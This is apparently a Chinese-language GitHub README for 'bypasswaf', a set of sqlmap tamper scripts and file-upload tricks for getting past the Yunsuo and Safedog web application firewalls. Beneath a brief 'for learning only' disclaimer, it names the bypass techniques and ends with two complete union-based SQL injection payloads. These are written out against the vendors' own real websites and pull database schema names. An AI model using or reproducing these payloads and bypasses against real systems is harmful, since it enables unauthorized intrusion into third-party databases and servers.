# bypasswaf

仅供学习 请勿用作非法用途<br>

2.0：<br>
增加优化了部分规则 现在bypass云锁tamper及bypass安全狗tamper支持所有的注入类型了！<br>
更新了bypass 安全狗 任意文件上传的方法（适用于业务系统存在任意文件上传漏洞但是服务器安装了安全狗环境）<br>
更新了bypass 安全狗 SQL注入tamper，现在支持所有类型的注入了<br>

## 针对最新版云锁和安全狗的sqlmap自动化绕过脚本<br>

包含：<br>
bypass安全狗sql注入tamper <br>
bypass云锁SQL注入tamper （可0警告绕过云锁）<br>
理论上来说规则越多速度也会越慢 所以不追求隐蔽性的可以按需求修改规则<br>

## 针对最新版安全狗的任意文件上传bypass<br>
safedog_upload_yichu.txt<br>
![Image text](https://github.com/pureqh/bypasswaf/blob/master/yichu.png?raw=true)
safedog_upload_huanhang.txt<br>
![Image text](https://github.com/pureqh/bypasswaf/blob/master/huanhang.png?raw=true)


## 利用知识点：<br>
安全狗：内联注释<br>
blog:https://pureqh.top/?p=1882<br>
~~云锁：引号包裹注释符绕过检测~~<br>
~~blog:https://pureqh.top/?p=4175~~<br>
云锁：多行注释符嵌入#绕过检测<br>
blog:https://pureqh.top/?p=4414<br>
文件上传：Content-Disposition参数溢出、文件名换行绕过<br>
blog:https://pureqh.top/?p=1225<br>

## 注：bypass云锁官网  
http://help.yunsuo.com.cn/guide/install/?id=1' REGEXP \"[…%252523]\" union select 1,group_concat(schema_name),3 from information_schema.schemata -- +<br>
## 注：bypass安全狗官网
https://www.safedog.cn/news.html?id=-1'  REGEXP \"[…%0a%23]\"    /\*!11444union %0a select\*/ 1,(select %0a group_concat(schema_name %0a /\*80000aaa\*/) %0a from %0a /\*!11444 /\*REGEXP \"[…%0a%23]\"\*/ %0a information_schema.schemata\*/),3-- +

